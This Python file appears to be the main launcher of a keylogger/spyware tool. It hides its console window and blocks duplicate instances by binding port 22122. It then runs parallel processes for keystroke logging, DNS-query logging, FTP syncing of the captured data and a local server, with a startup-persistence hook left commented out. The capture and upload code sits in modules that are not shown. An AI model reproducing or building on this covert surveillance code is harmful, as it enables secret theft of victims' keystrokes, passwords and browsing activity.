from utilities import dir_path, sync, server, hide_console, add_startup
from logger import key_logger, dns_logger
import sys
import socket
import multiprocessing

def main():

    # add_startup()
    
    #disallowing multiple instance
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Try to bind the socket to the port
    try:
        sock.bind(('', 22122))
    except socket.error:
        # If the port is already in use, exit the script
        print('Multiple Instance not Allowed')
        sys.exit()

    print("Npcap is required for Dns Logger. Get Npcap from https://npcap.com/#download")

    dir_path()
    p1 = multiprocessing.Process(target=key_logger, name="KeyLogger")
    p2 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
    p3 = multiprocessing.Process(target=sync, name="SyncFtp")
    p4 = multiprocessing.Process(target=server, name="LocalServer")

    p1.start()
    p2.start()
    p3.start()
    p4.start()

    p1.join()
    p2.join()
    p3.join()
    p4.join()


if __name__ == "__main__":
    hide_console()
    try:
        main()
    except:
        print("Program Inturrepted!!")
